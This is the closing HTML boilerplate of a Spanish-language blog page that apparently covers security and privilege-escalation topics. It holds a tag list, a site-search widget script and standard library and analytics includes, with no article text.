<a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/alwaysinstallelevated-privilege/">alwaysinstallelevated_privilege</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/android-debugger-bridge/">android_debugger_bridge</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://j0lm3d0.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No se han encontrado resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
